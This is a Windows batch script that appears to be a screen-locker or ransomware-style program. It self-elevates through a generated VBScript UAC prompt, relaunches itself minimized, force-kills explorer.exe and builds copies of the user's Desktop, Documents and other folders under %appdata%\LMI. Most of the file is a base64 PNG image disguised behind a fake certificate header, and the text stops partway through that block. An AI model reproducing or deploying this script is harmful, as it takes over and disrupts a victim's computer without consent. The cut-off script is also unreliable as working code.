@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    rem del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
pushd "%CD%"
    CD /D "%~dp0"

if not "%minimized%"=="" goto :minimized
set minimized=true
start /min cmd /C "%~dpnx0"
goto :EOF
:minimized

taskkill /f /im explorer.exe

:Folders
md %appdata%\LMI
md %appdata%\LMI\Desktop
md %appdata%\LMI\Downloads
md %appdata%\LMI\Videos
md %appdata%\LMI\Documents
md %appdata%\LMI\Music
md %appdata%\LMI\Pictures

:BG_Base64
cd %appdata%\LMI
echo -----BEGIN CERTIFICATE----->BG.txt
echo iVBORw0KGgoAAAANSUhEUgAABQAAAALQCAMAAAD4oy1kAAAAAXNSR0IArs4c6QAA>>BG.txt
echo AARnQU1BAACxjwv8YQUAAAEIUExURWsxNp95fLebna6OkZRqboJRVo1gZIlaXnU/>>BG.txt
echo Q5BlaIVVWc67vaqJjG42O6aDhqN/gohZXejf36mHiubc3f38/Jhvc7qfofn39///>>BG.txt
echo /9nKy9G+wOTZ2vDr68Cnqezl5rmdoJlyderi47WYmuXb3NzP0ODT1Ozk5cawsnE6>>BG.txt
echo P9/T1My4uvr5+XxJTtbGx/Tw8PPu7rKUl62NkMm0ttjJyrSXmaF8f8WusNXExcOr>>BG.txt
echo rZBkaMGpq9LBwtvNzoBPU/f09LGTlZJobJx1eN3Q0e7o6KSAg9fHyc+9vrCRlNPC>>BG.txt
echo w5ducu7n58u3ubyipL+lqPDq67yhpOHW13lESZpydtrLzYNTV8iytMexswAAAAXv>>BG.txt
echo Bd8AAABYdFJOU///////////////////////////////////////////////////>>BG.txt
echo ////////////////////////////////////////////////////////////////>>BG.txt
echo /wB4m8IIAAAACXBIWXMAAA7DAAAOwwHHb6hkAAA700lEQVR4Xu3dzW7byLawYcED>>BG.txt
echo ChEhA/bkcEDlOOAZxJDQoAW4sQGLDRFuDbzxAUEP9v3fyle11qo/SnKcxHZ3st8n>>BG.txt
echo 3ZYokVXFEllarKLIGQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIC/1Xhx98GeAviZLSpn4Z74x8q/>>BG.txt
echo 4h8/u8fx5Tv5N8z6g94op0V97VdZ/ripP+XhjEV7V11fNU82CeDn9aVxdp9ni4N7>>BG.txt
echo vHJ79eKqaX5bLer2mV188cWeeM/P+prGtilyKorxIy6uLppuNrtq2uVstrpq/mWv>>BG.txt
echo n9S5eWazmhYQ+BXUzV/yuGh28ji78Pv/4rk9fGFzqmdnfV0XZQNYFOP7LX7bzFrX>>BG.txt
echo 9tVSA5u75j/6+kkXmmmsLQA/sw/NtT659fGPU8th5ticP9p8Knf+p2dmfV0figZw>>BG.txt
echo UozvZm2aa9Xk7+ffnosAQ2v/m9UWgJ/Zoqn1SWuhoDsgdp6eCetii6Gem/V1lTlN>>BG.txt
echo ivHduknE1z4XAWqY6GrJagvAT213JS3e2GooaAeWz7VqXdnyjO/YAOax5qQY320S>>BG.txt
echo 8X1uVvbslMWVvPuZCBD4JVxoLHPRa+Qz6hGxNIBj/S8ZGfbGeqcT41Wzm8/1cFHI>>BG.txt
echo genJWV17Uc3m9c6GV48mZ4tVnNO/NxvTZPGeD/fcRN4q58XYyLulxcKnIA2me1dy>>BG.txt
echo rObV3D9xD3M/LaqqrecyED5b6Kq3FgEWhVtlpXbG50dKAPwknjTy2/3VffRBjXYB>>BG.txt
echo +j7AebPbuVbGJu8Wsw9XbmLcHZp2t6tTg3N21s2Xq2a83X2Yf5EshnLSqdvrxZ9X>>BG.txt
echo vr3xsz4t2n/9GQ4x7T1rZupmtah2H7NYMy+Gn7WyQNZ8aZsP9W68cO3U09X1n50P>>BG.txt
echo HS+ummbn4reFL2pI6GK3a9rDrv7sUtHRj9AH6FO9l8L559Xctbgp/iQABH4Rv936>>BG.txt
echo v/Wsl1BQuwBds3gnLdGFNlatNAoLbQJ21kaZ87NWddPKawt5azLpmhVpRaTBce+N>>BG.txt
echo Oz9pgzJ16//a4em/NEgdy9NgQjEsmbrNWsD5rtn5dD40vXRx3so67mwWi3JNq4e8>>BG.txt
echo izuN6j5rBGgFkLX5oPmnzsKumQacAP4W8+s/1fh907POx05jraFgOLfkqdEGQA8I>>BG.txt
echo x0abjt+kCTjqAzw76xj60/Q4+ykcOMqkhZ5uJv/e2FxJK7OUNi+MTct71l76xVIM>>BG.txt
echo FosR3y368izn0Fen+Yfla8kpiMtZYeWhKFxtK9zpg/uqsB6A6vr6T/nP6vJbpwH8>>BG.txt
echo oNqfy+xZePOt065ZcHHVhWsaWhcsheAodrdJM7MIrZq0FUcR4NlZ41sbaU/KyRCy>>BG.txt
echo aQsWWhxNpXjPQjzrbYysGPVHW48iBAyzdtq63UkDKGvoEo2RnAh9fuGJPEwKoBNP>>BG.txt
echo GvcNsRg/XPcA/mayj+9cA+FDQesCdJGPPcnDvc//I81J/pITx2aPZ41vff7NvxcT>>BG.txt
echo XfrJNsxukWOeiszu+fduw0Q53mzZxXeL+DAkZw2gjfToWd8XeSpp1PezxrfaB5gK>>BG.txt
echo 59rMD+VpzyEgBPALcDu7HPn6TkDrAnT7vB2lxXBvrD9e6TDBUQR4dtY0bCutVTn5>>BG.txt
echo W1vv/L+dNC8xQ2nQ2vZh5//tmls3oY1Yvrxn2cV3PzR39swJhSojwCcJMw8WUJqY>>BG.txt
echo gMa3S9/mLltXOC2Az6V3MZsFqM5t1tAC+Mm5I7zR7/suwIo/L5tGgBfNzh3/aVth>>BG.txt
echo LwXTCDCbNYVs0tGYNYBXnz//z3/mTuX+841ukaG9530Ocadz6jzAZQjgXAqpjYrJ>>BG.txt
echo dfquRYASWZZDICkBy0cCwWXzL1cwIa3lUP/WNCv7cmg1LQC/Ateu1BIvtf+JjUNs>>BG.txt
echo qzTOum39mXMSHIWWJ3pm1tTiSVyXJnedy01GZoP4nkaAeRaaq5OW96wYp98NfYA7>>BG.txt
echo fdciQNcQjpMhkCwBe1IeAkfVVei566whBPALWDS1/hyu24UuwBSQ+RP6rO/sTB/g>>BG.txt
echo mVl1LDWkJ2FWnFMmr8LohSgiwNlVdp7dUtL1TvYBxtKEKE+EWcs+QLeqq4Wua5RF>>BG.txt
echo gPJEV/LKRraFjfn2WsRlGAwG8CvY/Vsbkb7pQhsy6ZKzNkJjpNjXp56ZNQZl+iSO>>BG.txt
echo 4sqknncYlKncNRud8kL4lpYXVoyYTDEKHHK+LSPA2a5dhUY4mEaA8tDnBdBLYLnY>>BG.txt
echo MOtkBPCLqK33bEyjnWVAZkHShQ6CyEupfXhm1rHpZcrCtMmkjrq6AMsvUqayzN+L>>BG.txt
echo Z/qlCNKzYoR3F/+T9+2F2HMSAbon8nuXzHEEKA96xowWwAJkOw8cwC8lRlZpqPMp>>BG.txt
echo DKlKQKY/oVjVLjhyh4M7d3g4ShMmnpn1qbnyw8qLWz2gnExae7iQkecyFTep7x18>>BG.txt
echo w2XHnsPklyAulXs3s72rywUhArS+vBgBztppFDeEVn/Q6+LYQ16AJ20jex39GLKf>>BG.txt
echo AQL46cVerS6EOFdNI7/MkDN3Vy72aXa1azrqxrcBY9O0qR/suVnHprq/+ti0Nn7q>>BG.txt
echo Irgxm3TTbb3SHr5JKq5pS+/NZn82V9duwmWsPxcRUgwfzt03u/FLiOOUT861qxfu>>BG.txt
echo of0gl7luDvrOQ0rAk7f8e/YkTmsBNFSdtW2z+tJZt2AXfvkC4L/E+KeEPXrgu7m2>>BG.txt
echo YYGTslljH6Aq+/C84To/bi0N139aQ+lsrqeL5sXYXL80KJsOgTxnuLxOh8tjzGwn>>BG.txt
echo 3wIA8Lyy085NHrdi72h4qGb1K5TARmsA4Dl9uNy06v/eq+j17rD4d3sOAG+ru3LS>>BG.txt
echo 4eJVe/Uxm3x/9dX5A24AAAAAAAAAAAAAAAAAAAAA72YjV23X5/7Zc7/RfWfD9Bdj>>BG.txt
echo m1pOQ7ZzkY/efl2W/Bvn8hWjfTJe/vw0/1ku0gfoJ+2psmn/MWdv6BaQL6hSfpvs>>BG.txt
echo TclDnv11XZe/6L6vV7GyjvNeVLawX0YylJfz+fIcRZltUGQK/JBV24T79Qw799Tf>>BG.txt
echo jeMf4aLTawcm/dWFv8ORXkvl+O1XZcm/cS7O5sKeHPvgPprww+NN3X79Z9ByIRy7>>BG.txt
echo /I3jJ/PLzrhpf7HZ3l+uJrtDky6123V6EZ1gkab8HOEn2Su/sN9G6nY1Hx921zbX>>BG.txt
echo 5qrZ3V9cNQ86eTpvv7Av4HCwVPylc8IFcKc5FmWyFw5+a/17fw+OX02ftrvhanKt>>BG.txt
echo z7/RJiuXWLSbWet2qlr28aO3X5cl/8a5OAu7yNZJdqFCb1GXl4U47ba8XfCuDVfJ>>BG.txt
echo 9trQmF/kN39ywmW64g3qvT6fyC/g1cnCdqvljb0xNHp5syHeiuB03na/A9fYWUPd>>BG.txt
echo p996lzna81imW1tyuJqUHvgxTbzWpx5i/lOsy7anD1cQtEOgN26a9LLO4eHNPKWI>>BG.txt
echo 7Vh+MbDJhcFOk1vnJberrJLGXZiYJnUb7q0SL+3q7HbZXLtVuijF7/7leI3txW8y>>BG.txt
echo V7oFVEiiO5l3Fa5a29l3bXZt2CLHozKFBU5ckRb4EVXYUofnopF3t2zLC6/Y/SmD>>BG.txt
echo ZTx0eht6RXu7jd3b6Z9vAFPUV97R8wy9mnZ0O/qQ2eyuQwQ4ucZYtpS/RrYadkPW>>BG.txt
echo gHUf6ia0VHI9sCp+aV746/OEwM6prGncncx7ERrS1m6ZEm4jPc0xL5O0fLt4DcXx>>BG.txt
echo jT8S/LfpbPPt/in9fyLdr1dNmqLp26/Mkn/jXFydP9cA5pc/fNGlELviPnnuA72I>>BG.txt
echo Sy12sY8t3j7KdB/tSdaQ9dfxKNTZPc3acGy78ilmN9Dz35rZPUCXIWI7nfetBnJj>>BG.txt
echo q+1kvI30NMejMnVXMuW98UeC/zZ73WbT0dimP6zCiFwYmrNH/3BRx+E6Z5jP5vVD>>BG.txt
echo OnjerMqFde7NKs2SJ++Wno1pcjbWD2GiiADnVVvPKzn6HTSh8LZLOS6e5xJlSWal>>BG.txt
echo zxeL8tx1NzuKM/PlpPB5MmMdexFCVn7c0k+H4cuiusau2YVhzbzeXHNwWFWupcoj>>BG.txt
echo wKfZ5uJgC05TNZMIcDfGvrbZxXUMsI4jwNCapQZwN8761OTejm4h+wKSCLC4h3w5>>BG.txt
echo ZWnkefd3w9o+LbsFX9/r91l2j/kyx6My2QuphoDX0snxzS5ucu31vDrIN25t43+r>>BG.txt
echo xm/jfvTuw8IPxIVZ/7q4asbdrqpWYR9wCy/ur/yuls9dt1XlvvUlxEzJ+6WfFu3q>>BG.txt
echo srYbblTN3WJWtTKUuMz7APvdrmkPBzdX3epRVIjNfGqa32z2H5/Lx3iwJjTJj27J>>BG.txt
echo 4SErfb5YkGY9HwGm5ULhr+sw9Dk0159dTfmKilmtrppm52Zf7Fxb97QJ1fVFqmvc>>BG.txt
echo HdbtYSf9YFpvdr3X/zQrV0XtfWoQXAM41rvR1bPP24/kaqpXLlWdwevKO9a5kD5E>>BG.txt
echo 9+7TnYd1mfYBpuCqDR1tC/ckG5X1xwbhIFj6AN0hbFbLqd107Bj4TN7WVu42WtTU>>BG.txt
echo BTjNcVomCwmtqoFXVPkxvH5rU7UeiOg4353tLG7ndn8X/3H7bzXbpQ2+qsNJNLpl>>BG.txt
echo 28KyJce5N9ZltPPf+jF5F6y4pUdpb2yv0bBgkJ1r2gdosVgcmNW3LTUZq7Bc7E6+>>BG.txt
echo Jktynkpvg5h/xB3Oy3MPd7WcFCJfPV94DZ218JVWlQxXWlb+eRiZlWBnWl3xFsla>>BG.txt
echo IOvYXOmKjPkZH5UtuNFhmRAhPWkyJsVNQoIqncGF90Nj6zJtAONSdRiimD35tU89>>BG.txt
echo gi4ht7h9cLKwvzh2jD2z7cGXWmrOBY0hb1dLMe+Z3A1rWVsoKPfsE9Mcp2XSF54d>>BG.txt
echo NAe+kwsBl+GW5mHX1CYg9r2v5dWxCQdhwRi+tWWLDl3gT7J5x7lr283dxl8mP9pd>>BG.txt
echo 2jTSsnMelvLWNPiKjZVGhvp2yG/0+WW5REWSsTzWZOliQZm7NkWTQkxXz+pMW04b>>BG.txt
echo pdFIKVVUOK6rZd6yutxCWuYPeYHiEGt2GkxaUMt8YRGYphpkHWWei8LCcagLtWJ8>>BG.txt
echo NR1P6T5W1Xw+XrSx/dPI7CL2FUrvsN2eQPoAXTH8KXxWzjRC69iRdpb3asxiO5l3>>BG.txt
echo rPUjyNqzaY7TMnXt9fXldbjLH/CaXAi4so05BDn2JEQLS93Yn/ypyIUYTkjLVtsX>>BG.txt
echo tzZzVZjbAq7ZWMWn+iT2Hkkk5IIMv7g1PtMIUHa/9ETeLvKToNJ50rZBFEnup+WJ>>BG.txt
echo rbFXzKrN4LQQIQddLjSj2oqFihgk96yiWjmuXWhCZXXZopOEYxXloVp6rkXS8g2h>>BG.txt
echo UtQkAnRRWIjOXFN9PgJsdodD095l1SbdIemsGB8B+vn8HPGuUGPnDvFljjbP1rLx>>BG.txt
echo i4S8lylv14y6Ny5cQn4F8i7ASY7TMu3a68vLi2y0BXg9dfNv2+nS/cEldAmDj0vd>>BG.txt
echo X0cLPJL0it844wYqYVp8r2p2Ifk47CnhTdwX89FQDbuKPkAnTNrrOlPMzwdhT3H3>>BG.txt
echo OaJzx/KExaaH2Z7lriGLPQQxuz/8cnFgVgpf52GQK0usKO0h6zW2ydoxaSGttlOB>>BG.txt
echo 3HrETyAfrUj1rFWlqV5MYzl7om7lA/Qf3JNbjRiFTQdBJG7MBiDcHNod0q2tYZMI>>BG.txt
echo 0CXgvxK1D1D4rk7f9hWBp2XT7UPeY563e+Ze2238QsusC3DUDyLlOC2TjhD/s87U>>BG.txt
echo wi/jRts3Lx5qyuZrHVtuF5UZqskZFPkrt53bf9tDffDklwFjfK9vmn9rDhrdOU/+>>BG.txt
echo 4Oa4ARzr9uPaxzWTxsnCwvS6f3D5PRweXHYuYHAvuVzCUVnOJ/mHT3IfytO2u4ed>>BG.txt
echo W04Xy7hZryT3EPqVhXCrJ3S5fSi8hK+7/MjbrVisKG0GDto8pgZQ11j/+npLCWdV>>BG.txt
echo lBqAVM8aIOpB80EDx2AaAfrFpW2t3cIxCoufqdFeSjvfTtRt1165mghbhQ8lHTkI>>BG.txt
echo Lu4LOnS+Bby1k/rEqAetZ/KW1+Tkl94tlLoAXb2XOU7LZKsmnw3wyuKhaPYDDGmh>>BG.txt
echo QuDxTATovuqF+0p3AZPvupnPKzldIZt7qNdNs1pmIZVkGeewBvBCfoysB6Fl8BUn>>BG.txt
echo 7Yk8uD8+L/+/tAQb/5tRl0suSzKtjFtMFQ3Ice72YNJylc+jLHyMDkVeUWv3TjjY>>BG.txt
echo S69rx5k1gJZwNa8+Z3mejgBr+bmHnG+XHUKKSR+gNEI+VJTAKYsAywZQfz8Sz3Nx>>BG.txt
echo rC2PR6S39hn70wVS1CbkpbgNODb04SPAE3n7pm4p4Z7bcOYpnpvmGMoUGzxbtUv5>>BG.txt
echo C7yum6a3Z6mvTfaTGMTpD5BSTBfEqEpCID2uC8p4sZJoISYvMVJcWoIod5wje5fO>>BG.txt
echo UwZfacFWj89kWsYUC3OXS94Cdq1vi7VLL0WARTGDfNYzEWCRXUxOWrGuyDZVi28S>>BG.txt
echo xjhYkQXMUgZd7zLhuKZ5qJZq3vo977JUg1MR4JNre3rfJp3vA7TgKr7sD1pFGN6V>>BG.txt
echo hJzKHQT7gC7rZfU/brOgT9k5MbLI3mWpea/DOQY+dw0i221qv49yjGUKOd2Wqwa8>>BG.txt
echo puwQ2GIxv9+6Te7JvtwtAoxHfVGMTKRvLjuX34nRoZ0w4bv9yuTLIKrWHiDt5fta>>BG.txt
echo H6A8FOOPMZesjCFJObBPuRXFNGFWCVYsDEvRmCiymxbedl2VAjYJfxahTYtVYj+y>>BG.txt
echo s+ooEo5VlIdqqTG0NjNPNcj6AKV2pAzr9i8ZYcgiwFQ2z4KrNAKxDVmFAwNNyKmb>>BG.txt
echo //gIMPsBh8zyR5oOkbBEgMv1R807ngcoxdBid7vtjTxxYlgZc5yWKauh+F0NvJKs>>BG.txt
echo AbTzM9xG6UOa0OLZoOX06CkLdSSi8x07yU14r7ONt+0nyceuMtnprfNLe/mmAxSx>>BG.txt
echo b1IjQH27yM9ysQFrFZP0zU0sa1lMY7Na0BfizKIQ5XIxOWmSwllvbs3c/3kE6MKZ>>BG.txt
echo VdrBrQLtiTV2RcKxispDYFswjlxnqQYpAhx8utp1VzfXkknWB5iVzQlLxTUIH5db>>BG.txt
echo fS2e9QE6bXPln+slYbzRl7xPx8DhqTSALu9eDnPjL0GczhLtm0/y6IVzsGKOR2VK>>BG.txt
echo q5a1vsDr2KeDmLCD6WM4J+2gj/tJ8OB3APtC1l05HL4tfGtyE+au9dWF26FDgpp8>>BG.txt
echo GURZkHchPT+T4CsGhCE20+nwqs8v5pI10rbjXUgHVwp9imKaYtYQZ5aFKJcrC+/a>>BG.txt
echo Bt1FO599EWX16ah8X1bXrPPtg2tCQvPuE47nAeataKrL0DxmqQapD1BOStTAbWh0>>BG.txt
echo 0fMRYIgbbQ3i8WjMLEaAbllZOLV4sgIppB4aO9bVbsNhrXllEaBvkOVxjNHdbJ+a>>BG.txt
echo x5BjKNM61GoMbv2q6Y8igVfSh+3W6XWbtZMx9Gdyda8RUZ/6Cs2+6fwpLoPtAk86>>BG.txt
echo wyDDk3Fu3w/l9P5b3JLXBiC2BxJEaTfaqnax2MLtSmmvcIZ17CeX1wcdrLX2d+HH>>BG.txt
echo E2Mu/q+5DUluXZKp9FbMhY3NCp31S+0auXnYkSeFKJebtP2DXONz0POhi4papis4>>BG.txt
echo jc1Hqa5bK6Qf5/S/J4nrofWmrYe1XOJGr0M6u4+vFZGuCtfgGzv/hRayteApNjjT>>BG.txt
echo DzG03G4OKVWXevTsZzfZFahqycIVTdPYWmBmvbej/aYxy9uvkCt96nWdnFjgpYAy>>BG.txt
echo 5hjKVGkzvwy/vRv8qvV5zQA/qF/Lz1ZtanbZHC4vwqQ/0cFtfMt1c7vs0+WjIxdO>>BG.txt
echo XHbtOhw/+p2oXnX+Kkf53C6J1YW1kVnyfg7/UxC54O/K71aHw7+v3WTrf2jQhB/Z>>BG.txt
echo ulLIpNu5/DWE3RN7cO/cN+3B5Sdz+Vy+lP17C5/kxzufZHbxa1nMFzNr/3RWt9/6>>BG.txt
echo 3P05vi6Xj/6h+PmprZ5fzs+TFV6qyp5NK+rB9mbf4lf3Ul2Ws4uoWjnitPXQl++b>>BG.txt
echo 7tpN3GsGYt/N6t0XV4dpz08nkSgpbXOlD09LefRl6H2RRvmMXY1JccOn68hsoRlz>>BG.txt
echo z/x1we1tWY1GKyM2ga0e217X7e7hENo798K6PRzWoaV89ItI3v57JOYtlmHAR4+S>>BG.txt
echo Xe34d4sc5dPVMi19mQZdp/ZK3vYbSD7sAryy4TL7gt3kE0emHUp+4cu8XQnGdAeJ>>BG.txt
echo 8ymO+s6JHrrzhsv7lN94OT04Gi/llJyjJE8U02adtCsTZ1ZPDNcnVywbrDjqRN3E>>BG.txt
echo AhfrMVzvy1wG/6fK78JxNATy3jaXxUkpm/t3O0dlKL+6gL/NtEMJpeFQ5ecO79Nw>>BG.txt
echo wY+QVF8lJQA/wH4ijzN6d+yX9SPmna0/wKf6KgkB+AFd212lcxhwrM56+H11ta9S>>BG.txt
echo XUWqAAAAAAAAAAAAAAAAAAAAwH+bjVyKXZ/7Z/KTU3ibWs41th+4DtOfPP+QN0n0>>BG.txt
echo reg2EraSOOm5zSVM5lvO5rK+LraksV7FVXULxPf8wmnGMWShiRYpAG/hS7puyeCv>>BG.txt
echo A+JvivFeNuVVmf5h+u7CX8Opk0tE9d3kuljfJ6xxTPQNf872erUr14/ZHQ5tc/At>>BG.txt
echo VJz013jZ67Vc3GS3DtdmnG3b1Xw8HC5tetM1u0u3snY5GL982Mq+uOfx+jZ2R2FP>>BG.txt
echo 87AJ4A3ZBdi8IV0K+D38o2/zP7SbWeuaqa3sh0NWSz8grPFWLo/3Some8Zq1q5dK>>BG.txt
echo 9OWWr8pbu1ifXJsvvWuXE9Rrfbt31zo5rHWzCpeMDO2/Ki4FmF6OiQJvbN3INSsd>>BG.txt
echo PeZ7Nzf/5K/4Ply1zg7Lsmu6f7+4xnZ0F2OmN/Catdt9tNZI7//WxS/Ktd9ius42>>BG.txt
echo IL2DxyAvyqTEdv6meCo8261S6Pt7uqbN7pBdKidmCbytKmyNcgPDd9S/4i766vTC>>BG.txt
echo zlG8LfEPma6x3XjkTbxm7dp1nf3VvHyJuzA52/tJvYevJ9e53oeLOevVUO1eU164>>BG.txt
echo 80y3T3d78zeZU8Mhu3dcyhJ4Y+F2/OnOD+/DruP8zzRpm5avEgFO1vjzW0aAr1m7>>BG.txt
echo MRzTbroY8s2WMhmDNWns4j2dZjP/jZrfL9nuHrfbL+3weDZbxaCv7/NbvxEB4r3s>>BG.txt
echo tbv5JgaAm/5hFQbkwshcGqEzY52OmMc6LjC4xzEtPpnMkh67Zjcd6cvS8RPZIXk+>>BG.txt
echo sVmludzz8Hr2VPiBRHvUXJ5ZLf/Q1+FNFxVX7bbSO+8Mkmi8R92ZzINJusXqyxpX>>BG.txt
echo UhZNNN3pTpwo8OFcgYPN5YOvmI2WfbMKC2R5iW9J2z/klZGFYxqj2WSYIwVrW9/2>>BG.txt
echo 3RSXq89uue+PoGXObkyHHSkC7Pau7YzNIREg3o3e+Ehu4Opt2+t5dZAbjNVr3SRX>>BG.txt
echo eoeHZFjfLd2r8mLV3A2z6qNrP/+66Jr9ol1dPsidNCaTzu/tdVUdfPfa6O8gcTgc>>BG.txt
echo sqgzpePkGZQTvnj3nbZHv7dVNX6U4mdPxV3XNDvXwAyHrpFblJ1dreHgJhd+3DHs>>BG.txt
echo c3eHQ+MLt5w9tLqnhpvSncnclOlOVj+tcT1JVPVZgSUY1wJLX+S5z2Hb9PNqtd6u>>BG.txt
echo Gx97bdvL+SjH6tPafXnax5XhxOGLUQbDbTJ8Yaa7sPwhz9brokpiPOi/aqVt3Ln8>>BG.txt
echo wkFwjAD9CNwijbWXt3YB3lDVuD1BOmw8G8TTh/CdHO9Gqyp9We/jr8HR4Df76qEZ>>BG.txt
echo 5Y5pe5k/m5Qz34qkwx2+oyydMgOb6GSf1IW1T67Soy3fIFnPk7VNQm8y5/ZaKfoz>>BG.txt
echo q7XYNuNtFQc3hfX5bXrdJy0CPJN5FNNd+z19UhuzcKc9l6imPjnOfnGBg16bmqp5>>BG.txt
echo Gvu4gJVc71cZfVNl7CpX2VllxJvy1o2/l7lOxi7jGKzV2r71rrGNsad+gmbUht9F>>BG.txt
echo gK6GrAghArzxVxZPzV66DzDwxpbdulqGCxXHQTy5B264MXp+Z0THhgjka3y0GxdK>>BG.txt
echo L9nYWDoa3JSTMWntUJv0UoV0/vBv5hmkCbejVtYCjL41rO1mi679ri0xCWpU2LFr>>BG.txt
echo X4Qzq/WHvDo2B3s3SLch1kZK1+5c5lFMV3Ob1EZqlLQCpn2ApwssM93YW1ZgExpQ>>BG.txt
echo qcnQykrhsrzUS9IOhZ5WRhz23WrD3bXXl5fXjykCrKpqPq7a0Dj7+8i117pI96iP>>BG.txt
echo ws708xGgK5AUPkaAMhwcSumWi7c4Bt7avulWoYGz4MA/cX/Gcucw4Y7dg2+e3He5>>BG.txt
echo 36k0Rop3WL+V5iFOyi6aJe2fTBrAPJ0igzCx8RO1hRuDTzkkuPeHlfFppO3DIH9P>>BG.txt
echo r5bdvtZ6QXOhbbHQTx/OZR6ldKW6JrWR1thS17STMwV2T+LNlPIGMJ45LLPEwq3l>>BG.txt
echo FOij+PqracdCH1VG17jD6UPbPOovWHbt3eVlH0c3dv5d1+Ll9eCawEbu3NbmfXk2>>BG.txt
echo zOsjQJ+ofJ4hApSBlXj3ZyJAvKe6iad2xchBvo1DSBNudK2kEZnQmCk2mLqvp0mf>>BG.txt
echo qh0Bhi/6SYxiJJ0ig2LCBhJdoOhm2zdyhOndNHJP8UIth1+97m5F3nG1QtBjxYxS>>BG.txt
echo BKjBmk63FvRNM4/OpWu5hzW21I9GgYsCp8/BpTnKsWdM2ITlZVg21oy+Ovl6eXna>>BG.txt
echo x5Xh0nchXhoV0QPVeAgswVqK3dRwcFGgy7H7lFXSIosAXfPtkwnnAd7od0G3tk+x>>BG.txt
echo +6iPwDvY243+nRD6zJ58+BL3hmLHiy1ZMNYfW/l2D9GazRInZXeMAY9mN91FnbFu>>BG.txt
echo P/pDI4uYVD7fsvV9+57vt3S7Xbz/ePY0kIPCpTZT1jM2Wa0YAZZ7rzOJAGX6fObB>>BG.txt
echo UbpFbcR6s+PqowiwKLAVwKXpXgyHqRalGW3UXNzkD+tT4aTypl8vL0nbCq3tYWYy>>BG.txt
echo JKuTy3A7QD0tMJ0caDZd417aNdkdmW2A+FZrRQ6Cwy1D67Zr3X/rEDMzCox3FE5R>>BG.txt
echo dZt1PDWj3DmKBjBEQubL2v+EWPbmeJtgbbXSpNsdY1SlSR/torML+Smya6qW+clj>>BG.txt
echo RW7LP373Z3TMXUAiu/JQ/9E0K326XYenZul/eqC9/uk8vlOrdRz0ZBGgPJEH9+dc>>BG.txt
echo 5uYoAixqI66xJXoUARYFDu/JcfTpz8E1Gy6Dy7VP1gpXuX9SomntvjjtE3d6ngzJ>>BG.txt
echo 2oBKuA+6nhYYT2xJOpew/nbE9LqZhRNO/UHw1t62Q1/9MYnDKDDeUXbuVowOJHwJ>>BG.txt
echo MUwZeYQhRdXJz9lDH2AR88TJnWvEQtzjX5bBRNvWA01HRimKDPKJ5aTtdSqJNOLT>>BG.txt
echo vGS9y6eWCCQEcpPVsrGdOJmEsoZBEHlo8wEPMcnxKxFgjGUt9VghQSpwig4lzRiW>>BG.txt
echo FYMgfbdfdY8rbU8mhTuKr7+e9tnKmHTInQwIQ1N3k5rPygX6xVmBtYaDO8ugcnVn>>BG.txt
echo t3e3I2D3np1+QwSId5QiwLTj9H5TDOFAGXkUJ3fV2m0TRoF1gz6KAP1klrRffrKL>>BG.txt
echo bjVRCU8mGWQTRWRg3VK922XlpGX/1A6pxNCs5tbGPLtax0FPDJLsiT4UHVox8yzH>>BG.txt
echo H+wDPFNgt/onP4e+/B7KC5fyil6a9nFlTIdks2+k3lWmTVrwFrsGfUouwfRTYNfC>>BG.txt
echo WjWEDOpmaxFgCATdMtpgZp/zF3sE3kr2PR1/ySSjiiEcmJx/Fmb3/UAWxjwfAcou>>BG.txt
echo lyXtd5nJLhp66Xx6RQaTiaxPKYzctH16mpdzdtuG0yzOrJacr5eKmcTgTJ9oBHgq>>BG.txt
echo 8yI2Di3eNN1JH2BIPUZi0YkCb8sCZ7n1TVelxqoo3FHtOl9PWwp9c1wZZyNAae3C>>BG.txt
echo ZDjAjSW88dn0qT0NAyXWB+i0TavP44/rQiM5yQN4S1kEGJo6fZzbDncoGkC34eoe>>BG.txt
echo 0e1DNOO2br9Tx/BBg4wUAvmtuExaX0t7lv0SXs88XlvU5zJwh30pt9h2zBYu21qf>>BG.txt
echo z9f7+DRkqPp4gPrsasViRqcjwDjsOqTMF/myIZeYblEbVgsx9DuOAM8WOCVsXwZi>>BG.txt
echo 9Jfka5pWf/ERem994Y5q1/l62vJ4cyICPNkH6J/5Oojv6oeWxoO1DY5zD6GXMP3o>>BG.txt
echo fGz0VO54BOyq1U5jjFkWZ5oDb8HOShW2AYd9VnaHui+DlWHt++sG2TZ1+G9Vu5Zp>>BG.txt
echo 4aIJG07WYCdGlpraJGm3Z9zLPiJ2sslLOvMigzBxKxOj5jD4s15u9LSK3pUgPg37>>BG.txt
echo psjCszOrJesdY8xoWFtfo526Zg83mvm8yDzP8bZId1IbLgbTNY6JHu3bXynwti/a>>BG.txt
echo zK79varm1aVeWTWvGc1rTLXrvLgyrNBJ+L5Ty1bmdzl10mS2IfTcS2fs0FgCW4sb>>BG.txt
echo rW93lLEaZ+kC9qDWcLO4KqCUorU4dNQ8gLdzJ4FE3LMu14fLizDpNvL2samWaznz>>BG.txt
echo I3Ivh0XcBn84tHduW24Hf31p/+OH2qe4cnuWTvrxWZnZJx0vA7p3sUs8/dCHUi6d>>BG.txt
echo f0s6bpEsg8nEfdM+rLqd7OVt26y+aLCQPc08pD33xGrt3WrdLvt0VWyj+fmWyr/V>>BG.txt
